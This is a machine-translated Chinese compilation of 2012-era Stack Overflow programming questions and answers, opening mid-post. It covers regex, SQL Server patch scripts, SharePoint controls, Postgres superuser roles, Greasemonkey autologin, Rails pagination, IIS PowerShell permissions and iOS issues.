         NSData *response = [NSURLConnection sendSynchronousRequest:delReq returningResponse: &resp error: &err];
         NSString *reply = [[NSString alloc] initWithData:response encoding:NSUTF8StringEncoding];

         SBJsonParser *parser = [SBJsonParser new];
         id content = [reply JSONValue];
         if(!content){
              NSLog(@"%@", parser.errorTrace);
             [UIApplication sharedApplication].networkActivityIndicatorVisible = NO;
             return;
         }
         NSNumber *status = [content valueForKey:@"success"];
         NSNumber *one = [[NSNumber alloc] initWithInt:1];
         if ([status isEqualToNumber:one])
         {
              [categories removeObjectAtIndex:indexPath.row];
              [self.tableView deleteRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:UITableViewRowAnimationFade];
         }else 
         {
             UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Alert" message:@"Message" delegate:self cancelButtonTitle:@"Dismiss" otherButtonTitles:nil, nil];
             [alert show];
         }

     }
 }

 - (void)pullToRefreshViewShouldRefresh:(PullToRefreshView *)view;
 {
     NSString *isAuthenticated = [[NSString alloc] init];
     isAuthenticated = [self retrieveUserToken:[[NSUserDefaults standardUserDefaults] valueForKey:@"email"]];
     NSNumber *categorySelected = [[NSNumber alloc] init];
     categorySelected = [[NSUserDefaults standardUserDefaults] valueForKey:@"category_id"];
     if (![isAuthenticated length])
     {
         UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Alert" message:@"Message" delegate:self cancelButtonTitle:@"Dismiss" otherButtonTitles:nil, nil];
         [alert show];
         return;
     }else if (categorySelected ==nil) 
     {
          UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Alert" message:@"Message" delegate:self cancelButtonTitle:@"Dismiss" otherButtonTitles:nil, nil];
         [alert show];
         return;
     }
      [self getTableViewData];
 }

 - (IBAction)createEvent:(id)sender 
 {
     NSString *isAuthenticated = [[NSString alloc] init];
     isAuthenticated = [self retrieveUserToken:[[NSUserDefaults standardUserDefaults] valueForKey:@"email"]];
     NSNumber *categorySelected = [[NSNumber alloc] init];
     categorySelected = [[NSUserDefaults standardUserDefaults] valueForKey:@"category_id"];
     if (![isAuthenticated length])
     {
          UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Alert" message:@"Message" delegate:self cancelButtonTitle:@"Dismiss" otherButtonTitles:nil, nil];
         [alert show];
         return;
     }else if (categorySelected == nil) 
     {
         UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Alert" message:@"Alert" delegate:self cancelButtonTitle:@"Dismiss" otherButtonTitles:nil, nil];
         [alert show];
         return;
     }
     AddEventViewController *aevc = [self.storyboard instantiateViewControllerWithIdentifier:@"AddEventViewController"];
     [self.navigationController popToViewController:aevc animated:YES];
 } 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-03T00:00:42.157

我通过添加以下方法修复它

```
- (void)dealloc
{ 
    [self.tableView removeObserver:pull forKeyPath:@"contentOffset"];
} 
```

# ruby - 匹配不以 test.js 结尾但以 .js 结尾的文件的正则表达式

> ID：10757406
> 
> 赞同：2
> 
> 时间：2012-05-25T15:41:56.400
> 
> 标签：ruby, regex, regex-negation

以下是要匹配的示例字符串列表：

*   这些应该匹配：

    ```
    hello.js
    test.hello.js
    test.js.js
    test.js.hello.js
    test.js.test.js.test.js.dss.js
    test.js.dss.js
    test.js.js.js.js.dummy.js 
    ```

*   这些不应该匹配：

    ```
    fun.css
    test.js
    fun.test.js
    test.test.js
    test.js.test.js
    hell.cs
    test.test.js 
    ```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-25T15:56:03.753

一个简单的选择是使用否定的前瞻来检查该行是否以 结尾`.test.js`：

```
^(?!.*\.test\.js$).*\.js$ 
```

那个不包括`test.js`，这是一种特殊情况，但您可以使用`^(?!(?:^|.*\.)test\.js$).*\.js$`它来绕过它（或其他类似选项）。

工作示例：[http ://www.rubular.com/r/UVvRZMcnjl](http://www.rubular.com/r/UVvRZMcnjl)

如果您的风格支持lookbehinds（JavaScript 和旧的 Ruby 不支持，但 Ruby 1.9.2 支持），您可以使用：

```
^.*(?<!^test|\.test)\.js$ 
```

工作示例：[http ://www.rubular.com/r/lBCphNYEeS](http://www.rubular.com/r/lBCphNYEeS)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-25T15:45:57.550

由于问题标签已从[javascript](/questions/tagged/javascript "显示标记为“javascript”的问题")更改为[ruby](/questions/tagged/ruby "显示标记为“红宝石”的问题")​​ ，因此请使用简单的lookbehind：

```
.*(?<!test).js$ 
```

在此处查看实际操作：[http ://rubular.com/r/yVH2xfsRqw](http://rubular.com/r/yVH2xfsRqw)

# sql-server - 奇怪的行为从 .NET 执行 SQL Server 到 CREATE 表或列

> ID：10757410
> 
> 赞同：0
> 
> 时间：2012-05-25T15:42:21.983
> 
> 标签：sql-server, c#-4.0, patch

我有一个很大的 SQL 文本文件，其中有很多用于创建表、列等的 SQL 命令。

示例行：

```
IF NOT EXISTS ( SELECT * FROM dbo.sysobjects WHERE id = object_id(N'xcal_views') AND OBJECTPROPERTY(id, N'IsUserTable') = 1) 
   CREATE TABLE xcal_views (lid INT NOT NULL);
GO

IF NOT EXISTS ( SELECT * FROM dbo.sysobjects WHERE id = object_id(N'xcal_views_actors') AND OBJECTPROPERTY(id, N'IsUserTable') = 1) 
   CREATE TABLE xcal_views_actors (lid INT NOT NULL);
GO

IF NOT EXISTS ( SELECT * FROM dbo.syscolumns, dbo.sysobjects WHERE [dbo].[syscolumns].[name] = 'xlactor' AND [dbo].[sysobjects].[id] = [dbo].[syscolumns].[id] AND [dbo].[sysobjects].[id] = object_id(N'xcal_views_actors') AND OBJECTPROPERTY([dbo].[sysobjects].[id], N'IsUserTable') = 1 ) 
   ALTER TABLE [dbo].[xcal_views_actors] ADD xlactor INT NULL;
GO

IF NOT EXISTS ( SELECT * FROM dbo.syscolumns, dbo.sysobjects WHERE [dbo].[syscolumns].[name] = 'lparentid' AND [dbo].[sysobjects].[id] = [dbo].[syscolumns].[id] AND [dbo].[sysobjects].[id] = object_id(N'xcal_views_actors') AND OBJECTPROPERTY([dbo].[sysobjects].[id], N'IsUserTable') = 1 ) 
   ALTER TABLE [dbo].[xcal_views_actors] ADD lparentid INT NULL;
GO

IF NOT EXISTS ( SELECT * FROM dbo.sysobjects WHERE parent_obj = (SELECT id FROM dbo.sysobjects WHERE id = object_id(N'xcal_views_actors') AND OBJECTPROPERTY(id, N'IsUserTable') = 1) AND OBJECTPROPERTY(id, N'IsPrimaryKey') = 1) 
   ALTER TABLE [dbo].[xcal_views_actors] 
   ADD CONSTRAINT [CT_00000501] PRIMARY KEY CLUSTERED (lid ASC);
GO

IF NOT EXISTS ( SELECT * FROM [sys].[indexes] i INNER JOIN [sys].[objects] o ON o.object_id = i.object_id AND o.name = 'xcal_views_actors' WHERE i.name = 'parent_id' ) 
   CREATE INDEX parent_id ON xcal_views_actors (lparentid ASC)
GO 
```

在每个命令之间，我有一个`GO`额外的行来分隔命令。

`patch.sql`如果我从 SQL Server Management Studio运行整个文件，所有命令都会执行并且工作正常。

在 .NET 中，我阅读了整个文本文件，然后用“GO”拆分它们并对数据库执行每个 SQL 命令。

现在奇怪的是：一些命令没有被执行。我不知道为什么。

这是完成这项工作的方法：

```
private static void patchDatabase(string connection, string sqlfile)
{
  var defaultEncoding = Encoding.Default;
  using (FileStream fs = File.OpenRead(sqlfile))
  {
    defaultEncoding = TextFileEncodingDetector.DetectTextFileEncoding(fs, defaultEncoding, 1024);
  }
  //Console.WriteLine(string.Format("File {0} using encoding: {1}",sqlfile, defaultEncoding));

  var dbPatch = new StreamReader(sqlfile, defaultEncoding);
  string sqlPatch = dbPatch.ReadToEnd();
  dbPatch.Close();
  string[] stringSeparators = new[] {"GO"};
  string[] sqlPatches = sqlPatch.Split(stringSeparators, StringSplitOptions.None);

  if (connection != null && sqlPatch.Length > 0)
  {
    Console.WriteLine(string.Format("Executing {0} statements from {1}", sqlPatches.Length, sqlfile));

    using (var cnn = new SqlConnection(connection))
    {
      cnn.Open();
      foreach (var sql in sqlPatches)
      {
        if (String.IsNullOrEmpty(sql))
          continue; // Not a real sql statement, use next

        using (var cmd = new SqlCommand(sql, cnn))
        {
          try
          {
            cmd.CommandTimeout = 120;
            cmd.ExecuteNonQuery();
            //int results = cmd.ExecuteNonQuery();
            //if (results < 1)
            //  Console.WriteLine(String.Format("Failed:\nResult: {0}\n{1}",results, sql));
          }
          catch (Exception ex)
          {
            Console.WriteLine("Execution error!\n\n" + sql + "\n\n\n" + ex);
          }
        }
      }
      cnn.Close();
    }

  }
} 
```

它看起来像我的功能飞溅......

我当前的文本文件大约有 6.000 多行。

知道我做错了什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T18:51:10.537

看起来这根本不是编码问题。

实际上我产生了以下情况：

*   我有一个数据库“test_db”

*   我创建了一个用户“test_db_user”并使他成为 db_owner 他通常添加到 sql server 中“安全 - 角色”，objekt“test_db”作为角色 db_owner 他还被添加为数据库“test_db”中的用户 - 安全 - 用户。

*   现在它来了：经过一些测试，我再次恢复了数据库。该用户不再列在“test_db”-安全-用户中，但通常仍配置为 db_owner。

然后连接以某种方式工作，但它始终没有完全访问数据库。无法真正知道出了什么问题。在管理工作室中，我曾经使用管理员帐户来启动 sql 批处理，这就是它一直在那里工作的原因。

**所以解决方案：确保安全设置 100% 正确，然后它可以工作：S**

**另一个问题是我的愚蠢:S!!! 我有一些没有 dbo 的创建表语句。表之前的模式，因此不同的用户为表创建了不同的模式名称。**

感谢大家的反馈。

# c# - 访问由 CreateChildControls() 创建的控件

> ID：10757415
> 
> 赞同：3
> 
> 时间：2012-05-25T15:42:30.110
> 
> 标签：c#, sharepoint-2010

我需要从另一个类访问由 CreateChildControls() 创建的控件，这样当我选择文件时，我就有了要引用的字符串路径。

我已经尝试了访问动态创建的控件[（c#）](https://stackoverflow.com/questions/2982198/accessing-controls-created-dynamically-c)和[访问动态创建的控件中的问题中](https://stackoverflow.com/questions/3362188/problem-in-accessing-dynamically-created-controls)的解决方案 但是没有喜悦谢谢

```
 publicTextBox txtUrl; 

    protected override void CreateChildControls()
    {
        Label lblUrl = new Label();
        lblUrl.ID = "lblUrl";
        lblUrl.Text = "Url: ";
        Controls.Add(lblUrl);

        TextBox txtUrl = new TextBox();
        txtUrl.ID = "txtUrl";
        Controls.Add(txtUrl);

        AssetUrlSelector picker = new AssetUrlSelector();
        picker.ID = "ausUrl";

        picker.DefaultOpenLocationUrl =  OpenUrl;
        picker.AssetUrlClientID = txtUrl.ClientID;
        picker.AssetUrlTextBoxVisible = false;
        Controls.Add(picker);

        Control control = Page.LoadControl(_ascxPath);
        Controls.Add(control);

    } 
```

从另一个班级我应该能够访问文本框

```
 protected void Button1_Click(object sender, EventArgs e)
    {
        AssetPicker asspi = new AssetPicker();

        string aaa = asspi.txtUrl.Text;

    } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-25T17:01:35.377

> 我必须将控件公开才能从另一个班级访问。但它会返回空引用错误。我已经更新了最初的帖子

如果您公开公开您的子控件，则需要`EnsureChildControls`为每个公开公开的子控件调用 getter。这将强制`CreateChildControls`执行，从而构建您的控制树，确保调用者不会获得空引用。

例如：

```
public Button MyChildButton
{
    get
    {
        EnsureChildControls();
        return _myChildButton;
    }
}
private Button _myChildButton;

...

protected override void CreateChildControls()  
{
    ...
    _myChildButton = new Button();
    ... 
} 
```

请注意，为了做到这一点，您需要将您的子控件公开为属性，而不是字段。即在您的示例代码中，您需要替换：

```
public TextBox txtUrl; 
```

经过：

```
public TextBox TxtUrl
{
    get
    {
        EnsureChildControls();
        return txtUrl;
    }
}
private TextBox txtUrl; 
```

您还应该继承 from `CompositeControl`，它对`Controls`属性执行类似的操作：

```
public override ControlCollection Controls
{
    get
    {
        EnsureChildControls();
        return base.Controls;
    }
} 
```

如果由于某种原因您没有从 继承`CompositeControl`，那么您需要将此 Controls 覆盖添加到您的类中。

顺便说一句，暴露子控件可能会给调用者提供太多信息，调用者可能不应该关心这些实现细节。相反，您只能公开子控件的相关属性。例如`TxtUrl`，您可以公开一个字符串属性，而不是公开一个子 TextBox `Url`：

```
public string Url
{
    get
    {
        EnsureChildControls();
        return txtUrl.Text;            
    }
    set
    {
        EnsureChildControls();
        txtUrl.Text = value;
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T15:49:46.267

最后，当您将静态控件添加到页面时，.NET 会做什么，它将控件的引用作为字段保存（它们通常转到 .designer 文件）。因此，只需以相同的方式将控件作为字段：

```
private Label lblUrl;
private TextBox txtUrl;
private AssetUrlSelector picker;
private Control control;

protected override void CreateChildControls()
{
    lblUrl = new Label();
    lblUrl.ID = "lblUrl";
    lblUrl.Text = "Url: ";
    Controls.Add(lblUrl);

    txtUrl = new TextBox();
    txtUrl.ID = "txtUrl";
    Controls.Add(txtUrl);

    picker = new AssetUrlSelector();
    picker.ID = "ausUrl";

    picker.DefaultOpenLocationUrl =  OpenUrl;
    picker.AssetUrlClientID = txtUrl.ClientID;
    picker.AssetUrlTextBoxVisible = false;
    Controls.Add(picker);

    control = Page.LoadControl(_ascxPath);
    Controls.Add(control);
} 
```

# delphi - Datasnap XE2：如何发送抽象类？

> ID：10757420
> 
> 赞同：1
> 
> 时间：2012-05-25T15:42:39.640
> 
> 标签：delphi, delphi-xe2, datasnap

我目前正在尝试从我的数据快照服务器接收一个复杂的对象。

此对象包含以下类型的属性： TList< AnAbstractClass > 我使用从 AnAbstractClass 继承的类填充此 TList。

但是在客户端，发生了 EConversionError。如果我用 TList< AConcreteClass > 替换 TList< AnAbstractClass > 一切都很好，所以问题出在继承上。

有没有办法做到这一点？

rgds

# c++ - 避免在 linux 下对共享对象 C 接口进行名称修改

> ID：10757421
> 
> 赞同：1
> 
> 时间：2012-05-25T15:42:40.390
> 
> 标签：c++, c, linux, shared-objects, name-mangling

在 Windows 下，我们有一个 C 接口 (extern "C" { // interface }) 到我们的 C++ 库，它使用模块定义文件 (.def) 导出未损坏的函数。

我正在尝试在我相对缺乏经验的 linux 下重新创建相同的东西。据我了解，在 NIX 系统下，所有功能都是默认导出的。考虑到这一点，我创建了一个共享对象，我通过 nm 命令运行了它。

我很惊讶地发现，与 Windows 不同，我的函数名称被弄乱了！

请问我该如何防止这种情况？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-25T15:48:10.920

通常的解决方案是声明函数`extern "C"`。这不仅会导致名称像 C 中那样被破坏，而且还会导致函数使用 C 调用约定。

# plugins - BIGINT UNSIGNED 值超出范围错误（错误号：1690）

> ID：10757428
> 
> 赞同：0
> 
> 时间：2012-05-25T15:43:05.787
> 
> 标签：plugins, vbulletin

当我尝试删除 vBulletin 4 中的线程时，我收到此错误。这不是 vBulletin 问题，因为它是附加修改。下面是我正在使用的代码。如果他们在线程帖子中有 15 个单词并且我删除了线程，即使正在删除 15 个单词，我也会收到错误，将他们的单词计数设置回零，而不是负数。

```
$threadinfo = fetch_threadinfo($threadid); 
$postinfo = fetch_postinfo($threadinfo['firstpostid']); 
$userdm =& datamanager_init('User', $this->registry, ERRTYPE_SILENT); 
$userdm->set_existing($postinfo); 
$userdm->set('totalwords', 'totalwords - ' . str_word_count($postinfo['pagetext']), false); 
$userdm->save(); 
unset($userdm); 
```

谁能告诉我我错过了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-17T09:12:29.437

```
$threadinfo = fetch_threadinfo($threadid); 
$postinfo = fetch_postinfo($threadinfo['firstpostid']); 
$userdm =& datamanager_init('User', $this->registry, ERRTYPE_SILENT); 
$userdm->set_existing($postinfo); 
$userdm->set('totalwords', 'totalwords' - . str_word_count($postinfo['pagetext']),   false); 
$userdm->save(); 
unset($userdm); 
```

# jquery - 自定义 jQuery Datepicker 下一个按钮的行为

> ID：10757430
> 
> 赞同：1
> 
> 时间：2012-05-25T15:43:10.550
> 
> 标签：jquery, datepicker

我正在开发一个航空公司预订系统，我们使用一个高度定制的 jQuery Datepicker 来显示我们飞行给定路线的日期。最新的要求是当用户单击“下个月”时进行自定义跳转，即如果该月没有航班（没有通过 beforeShowDay 回调设置可选择的日期），日历将跳转到具有下一个可用航班的月份. 就像是：

```
 function handleMonthYearChange(year, month, inst){
    // look-up month with next available flights - say two months from now.
    // get the dpInstance, and then force a custom span 
    $.datepicker._adjustDate(dpInstance ,**2**,'M'); 
} 
```

我想了一会儿我可以将自己的值分配给月份参数，然后让函数返回。没有这样的运气

在日历加载时执行 setSelectable 逻辑的所有代码都已编写并生效。我需要能够在 Prev 和 Next 上捕捉这些 UI 点击，执行我的“Next FLights”查找，然后跳转到下个月的可选日期。

非常感谢任何建议

标记

# sql - postgres：将用户升级为超级用户？

> ID：10757431
> 
> 赞同：701
> 
> 时间：2012-05-25T15:43:18.613
> 
> 标签：sql, postgresql

在 postgres 中，如何将现有用户更改为超级用户？由于各种原因，我不想删除现有用户。

```
# alter user myuser ...? 
```

* * *

## 回答 #1

> 赞同：1361
> 
> 时间：2012-05-25T15:46:25.913

```
ALTER USER myuser WITH SUPERUSER; 
```

您可以在[文档中阅读更多信息](http://www.postgresql.org/docs/current/static/sql-alteruser.html)

* * *

## 回答 #2

> 赞同：69
> 
> 时间：2015-09-23T10:36:59.887

要扩展上述内容并快速参考：

*   使用户成为超级用户：`ALTER USER username WITH SUPERUSER;`
*   使用户不再是超级用户：`ALTER USER username WITH NOSUPERUSER;`
*   只允许用户创建数据库：`ALTER USER username CREATEDB;`

您还可以使用`CREATEROLE`和`CREATEUSER`允许用户特权而不使他们成为超级用户。

[文档](http://www.postgresql.org/docs/current/static/sql-alteruser.html)

* * *

## 回答 #3

> 赞同：30
> 
> 时间：2016-11-07T16:57:28.640

$ `su - postgres`
$ `psql`
$`\du;`用于查看 db 上
的用户，选择您希望成为超级用户的用户，然后：
$ `ALTER USER "user" with superuser;`

* * *

## 回答 #4

> 赞同：12
> 
> 时间：2018-08-27T15:15:08.443

有时升级到超级用户可能不是一个好的选择。因此，除了超级用户之外，您还可以使用许多其他选项。打开终端并输入以下内容：

```
$ sudo su - postgres
[sudo] password for user: (type your password here)
$ psql
postgres@user:~$ psql
psql (10.5 (Ubuntu 10.5-1.pgdg18.04+1))
Type "help" for help.

postgres=# ALTER USER my_user WITH option 
```

还列出了选项列表

```
SUPERUSER | NOSUPERUSER | CREATEDB | NOCREATEDB  | CREATEROLE | NOCREATEROLE |
CREATEUSER | NOCREATEUSER | INHERIT | NOINHERIT | LOGIN | NOLOGIN | REPLICATION|
NOREPLICATION | BYPASSRLS | NOBYPASSRLS | CONNECTION LIMIT connlimit | 
[ ENCRYPTED | UNENCRYPTED ] PASSWORD 'password' | VALID UNTIL 'timestamp' 
```

所以在命令行中它看起来像

```
postgres=# ALTER USER my_user WITH  LOGIN 
```

或使用加密密码。

```
postgres=# ALTER USER my_user  WITH ENCRYPTED PASSWORD '5d41402abc4b2a76b9719d911017c592'; 
```

或在特定时间后撤销权限。

```
postgres=# ALTER USER my_user  WITH VALID UNTIL '2019-12-29 19:09:00'; 
```

* * *

## 回答 #5

> 赞同：10
> 
> 时间：2017-05-08T15:48:49.187

运行此命令

```
alter user myuser with superuser; 
```

如果您想查看用户的权限，请运行以下命令

```
\du 
```

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2019-04-03T08:14:41.013

您可以创建一个`SUPERUSER`或提升`USER`，所以对于您的情况

```
$ sudo -u postgres psql -c "ALTER USER myuser WITH SUPERUSER;" 
```

或回滚

```
$ sudo -u postgres psql -c "ALTER USER myuser WITH NOSUPERUSER;" 
```

*要防止在设置密码时记录命令，请在其前面插入一个空格，但请检查您的系统是否支持此选项。*

```
$  sudo -u postgres psql -c "CREATE USER my_user WITH PASSWORD 'my_pass';"
$  sudo -u postgres psql -c "CREATE USER my_user WITH SUPERUSER PASSWORD 'my_pass';" 
```

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2017-11-12T10:38:45.653

```
alter user username superuser; 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2021-10-08T17:57:20.483

如果您因为使用 Amazon Redshift 而达到此目标，则无法分配`SUPERUSER`

```
ALTER USER <username> SUPERUSER; 
```

而是分配`CREATEUSER`：

```
ALTER USER <username> CREATEUSER; 
```

显然，`SUPERUSER`不是 Amazon Redshift 集群中的可用用户分配。我对此感到非常困惑。

[https://docs.aws.amazon.com/redshift/latest/dg/r_superusers.html](https://docs.aws.amazon.com/redshift/latest/dg/r_superusers.html)

显示此的屏幕截图：

*   [https://i.stack.imgur.com/uyWXt.png](https://i.stack.imgur.com/uyWXt.png)
*   [https://i.stack.imgur.com/ycbeL.png](https://i.stack.imgur.com/ycbeL.png)

# javascript - Javascript倒计时 - 不倒计时

> ID：10757433
> 
> 赞同：-1
> 
> 时间：2012-05-25T15:43:24.337
> 
> 标签：javascript, countdown

我有一个倒计时脚本，它可以获取实时时间并从设定的时间中减去它。除非您刷新页面，否则它不会更新，这一切都有效。我的函数底部的 setInterval 指示函数每隔一秒运行一次，但它似乎没有这样做......

有人可以帮忙吗？

这是我的 jsfiddle：http: [//jsfiddle.net/4yMZy/](http://jsfiddle.net/4yMZy/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-25T15:51:52.597

每次`cCountDown`运行时，它都会像这样计算剩余时间：

```
nDates = new Date(datetime);
xDay = new Date("Fri, 26 May 2012 16:34:00 +0000");
timeLeft = (xDay - nDates); 
```

there的值`datetime`永远不会从一次运行到另一次变化。所以 cCountDown 一直在运行，但总是在比较相同的两个日期之间的差异。由于使用了相同的两个日期，因此差异始终相同，因此您看不到任何倒计时发生。

您可以更改`nDates = new Date(datetime);`为`nDates = new Date();`它会开始倒计时，但我不确定您为什么首先`datetime`从某些服务器获取。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T16:14:40.983

您的代码还有其他一些问题。您应该通过 jslint 或[jshint](http://www.jshint.com/)运行它。

如果将您的代码更改为[http://jsfiddle.net/4yMZy/7/](http://jsfiddle.net/4yMZy/7/)

因此它会根据设置的间隔获取时间并更新秒数。

编辑：jsfiddle 实际上在顶部提供了一个按钮。

# javascript - Facebook 自动登录 JS 在控制台中有效，但在 GM 脚本中无效

> ID：10757435
> 
> 赞同：1
> 
> 时间：2012-05-25T15:43:25.680
> 
> 标签：javascript, facebook, greasemonkey, autologin

我正在尝试为 Facebook 创建一个自动登录脚本，而不是使用预先存在的脚本。当我在 Firefox 和 Chrome 的 javascript 控制台中运行以下代码时，用户名和密码字段都按预期填写：

```
var username = "myemail@email.com";
var password = "password";
var f = document.getElementById("login_form");
f.elements.namedItem("email").value = username;
f.elements.namedItem("pass").value = password; 
```

但是当我将它作为 Greasemonkey 脚本运行时，它们不会填写：

```
// ==UserScript==
// @name           Auto Login for FB
// @namespace      hamsolo474
// @description    AutoLogin 
// @include        https://www.facebook.com
// ==/UserScript==
var username = "myemail@email.com";
var password = "password";
var f = document.getElementById("login_form");
f.elements.namedItem("email").value = username;
f.elements.namedItem("pass").value = password; 
```

我通读了[这个链接](http://commons.oreilly.com/wiki/index.php/Greasemonkey_Hacks/Getting_Started#Pitfall_.233%3a_Named_Forms_and_Form_Elements)，但这似乎没有帮助。这是我在其他网站上成功运行的 GM 脚本的衍生版本，我不明白为什么它不能在这里工作，任何帮助将不胜感激！

* * *

**编辑：**
我还尝试了另一种方法：

```
var username = "myemail@email.com";
var password = "password";
document.getElementsByName("email", "input")[0].value = username;
document.getElementsByName("pass", "input")[0].value = password; 
```

作为javascript和：

```
// ==UserScript==
// @name           Auto Login for FB
// @namespace      hamsolo474
// @description    AutoLogin 
// @include        https://www.facebook.com
// ==/UserScript==
var username = "myemail@email.com";
var password = "password";
document.getElementsByName("email", "input")[0].value = username;
document.getElementsByName("pass", "input")[0].value = password; 
```

作为 GM，就像我的第一个方法一样，它适用于 Firefox 和 Chrome 的 JS 控制台，但不适用于 GM。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-26T05:40:11.600

问题似乎是`@include`指令设置不正确。利用：

```
// ==UserScript==
// @name           Auto Login for FB
// @namespace      hamsolo474
// @description    AutoLogin 
// @include        http://www.facebook.com/*
// @include        https://www.facebook.com/*
// ==/UserScript==
var username = "myemail@email.com";
var password = "password";
var f = document.getElementById("login_form");
f.elements.namedItem("email").value = username;
f.elements.namedItem("pass").value = password; 
```

* * *

**但是：在***任何*代码文件 中嵌入帐户信息总是一个坏主意。

如果您只是想更轻松地进入您的 Facebook 帐户，那么使用安全登录插件会更好，[也*更*安全](https://addons.mozilla.org/en-US/firefox/addon/secure-login/)。

# ruby-on-rails - kaminari 和 order_by

> ID：10757438
> 
> 赞同：3
> 
> 时间：2012-05-25T15:43:29.880
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3

所以我列出了我网站的所有成员并按名称对它们进行分组，以便更好地组织列表。因此，在我看来，我的所有成员都按其成员名称的第一个字母分组，例如：

```
B

Bakedfish
Beercan Dan
Bigmike33x 

C

Cynicalassassin
ect.. 
```

无论如何，我也想对这个列表进行分页，但如果我使用 order，我无法将 Kaminari 的分页参数添加到我的控制器中，因为我得到一个未定义的方法错误。

所以这不起作用：

```
@members = Member.all.group_by{|u| u.fullname[0].titleize}.page(params[:page]).per(18) 
```

我的观点是这样的：

```
<div class="content">
  <%= paginate @members %>
</div>
    <% @members.keys.sort.each do |starting_letter| %>
            <h3>
            <%= link_to starting_letter, {:action => :browse, :controller =>:members, :letter => starting_letter } %>
</h3>
      <ol>
                <% @members[starting_letter].each do |member| %>
                    <li>
                        <% if member.is_artist? %>
                            <%= link_to member.full_name, member_path(member), :class=>"artist" %>
                        <% else %>
                            <%= link_to member.full_name, member_path(member) %>
                        <% end %>
                    </li>
                <% end %>
        </ol>
    <% end %> 
```

这是我的错误信息：

```
NoMethodError (undefined method `page' for #<Hash:0x007f78d4bf48f8>):
  app/controllers/members_controller.rb:10:in `index' 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-25T16:46:58.427

Kaminari 添加`page`方法`ActiveRecord::Relation`但`Member.all.group_by`返回哈希。这就是为什么你会得到这个例外。

我建议在分页后进行分组，例如：

```
@members = Member.order(:full_name).page(params[:page]).per(18).to_a.group_by { |u| u.fullname[0].upcase } 
```

**更新**

为了使用`paginate`帮助器，您可以分配 2 个变量，例如：

```
@paginated_members = Member.order(:full_name).page(params[:page]).per(18)
@members = @paginated_members.to_a.group_by { |u| u.fullname[0].upcase } 
```

并传递`@paginated_members`给`paginate`助手。

# c# - 在 IIS 网络服务器上使用 powershell 时访问被拒绝

> ID：10757441
> 
> 赞同：1
> 
> 时间：2012-05-25T15:43:38.470
> 
> 标签：c#, asp.net, powershell

我有一个 0ffice 365 用户的密码重置网站。它在后台运行 powershell 命令来重置用户密码。出于某种原因，当我使用 VS 并使用页面运行浏览器时，它运行良好。但是，当我从实时站点运行它时，出现此错误

```
Processing data from remote server failed with the following error message: Access is denied. For more information, see the about_Remote_Troubleshooting Help topic. 
```

该页面是带有 C# 代码的 aspx.net。

我曾尝试使用模仿者类，但这也不起作用。

这是我的一些代码。

```
 using (new Impersonator("user", "domain", "pass"))
    {

        PSCredential creds = new PSCredential("office365email", "password");

        WSManConnectionInfo connectionInfo = new WSManConnectionInfo(
            new Uri("https://server.outlook.com/PowerShell-LiveID?PSVersion=2.0"),
            "http://schemas.microsoft.com/powershell/Microsoft.Exchange", creds);
        connectionInfo.AuthenticationMechanism = AuthenticationMechanism.Basic;

        Runspace runspace = RunspaceFactory.CreateRunspace(connectionInfo);

        runspace.ApartmentState = System.Threading.ApartmentState.STA;
        runspace.ThreadOptions = PSThreadOptions.UseCurrentThread;

        try
        {

            runspace.Open();

            pipeline = runspace.CreatePipeline();

            Command forwardcommand = new Command("Set-Mailbox");
            forwardcommand.Parameters.Add("Identity", user);
            forwardcommand.Parameters.Add("Password", pass);

            pipeline.Commands.Add(forwardcommand);

            try
            {
                pipeline.Invoke();

                runspace.Close();
                pipeline.Stop();
                return "Password Successfully Changed";

            }
            catch (Exception er)
            {
                runspace.Close();
                pipeline.Stop();

                return er.Message;

            }
        }
        catch (PSRemotingTransportException eer)
        {

            runspace.Close();

            return eer.Message;// "Server busy please try again later";
        }
    } 
```

有什么想法为什么我不能从实际网站上做到这一点，但我可以在我的本地主机上做到这一点？

```
<authentication mode="Windows"/>
    <roleManager enabled="true" defaultProvider="AspNetWindowsTokenRoleProvider">
        <providers>
            <clear/>
            <add connectionStringName="ApplicationServices" applicationName="/" name="AspNetSqlRoleProvider" type="System.Web.Security.SqlRoleProvider"/>
            <add applicationName="/" name="AspNetWindowsTokenRoleProvider" type="System.Web.Security.WindowsTokenRoleProvider"/>
        </providers>
    </roleManager>
    <identity impersonate="true"/> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2018-08-02T18:06:16.593

在 IIS 中，我将 ApplicationPoolIdentity 更改为 LocalService。这解决了在发布之前运行正常的 Visual Studio 网站时访问被拒绝错误。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T15:48:42.620

这可能是一个“双跳”身份/安全问题。

在 localhost 上运行时，Windows 身份在同一台机器上是已知的。
在 Web 服务器上运行时，至少还涉及一台机器。

相关问题包括： IIS 使用什么身份来运行网页？该 ID 是否有权使用网络？该 ID 是否有权在远程服务器上执行密码重置？

# iphone - iOS uiwebview 清除触摸事件历史

> ID：10757443
> 
> 赞同：1
> 
> 时间：2012-05-25T15:43:48.583
> 
> 标签：iphone, objective-c, ios, xcode, cocoa-touch

我正在为 uiwebview 禁用 setUserInteraction。5 秒后，我再次启用它。问题是，如果用户在这 5 秒内触摸它，则不执行操作，但在超时后，执行操作！如何在再次设置交互之前完全禁用 userInteraction 或清除事件历史记录？谢谢你。

* * *

